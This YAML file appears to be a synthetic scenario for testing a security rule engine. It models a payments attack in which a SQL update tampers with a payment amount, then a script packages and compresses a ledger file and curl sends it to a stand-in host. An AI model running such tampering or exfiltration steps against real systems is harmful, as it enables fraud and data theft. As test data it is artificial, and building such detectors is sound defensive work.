scenario_id: ecommerce_run_03_payments_amount_tamper_mal
family_id: ecommerce_run_03_fam_payments_tamper
domain: ecommerce
default_class: malicious
rule_engine_relationship: malicious_false_negative
time_of_day: "03:05"
sessions:
  - session_label: tamper
    role: payments_service
    anchor: db
    timing:
      tempo: bursty
      step_gaps_seconds: [1.0]
    events:
      - step_id: tamper_amount
        sql: "UPDATE payments SET amount = 0.01 WHERE payment_id = 88213"
      - step_id: package
        process: {comm: bash, args: ["/tmp/package_ledger.sh", "--payment", "88213"], parent: tamper_amount}
      - step_id: compress
        process: {comm: gzip, args: ["/tmp/ledger_88213.json"], parent: package}
      - step_id: exfil
        process: {comm: curl, args: ["-sX", "POST", "https://sync.datasink.example/drop", "--data-binary", "@/tmp/ledger_88213.json.gz"], parent: compress}
        connects_to: {ip: "141.98.11.23", port: 8443}
